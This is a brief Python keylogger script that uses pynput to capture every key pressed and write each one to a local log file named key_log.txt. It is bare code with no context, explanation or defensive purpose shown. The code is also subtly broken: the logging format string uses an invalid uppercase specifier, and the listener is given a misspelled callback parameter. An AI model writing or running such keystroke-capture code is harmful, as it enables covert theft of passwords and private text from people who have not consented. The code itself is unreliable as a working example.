from pynput.keyboard import Key,Listener
import logging
log_dir=" "
logging.basicConfig(filename=(log_dir + "key_log.txt"),level=logging.DEBUG,format='%(asctime)S%(message)S:')
def on_press(key):
    logging.info(str(key))
with Listener(onpress=on_press)as listener:
    listener.join()
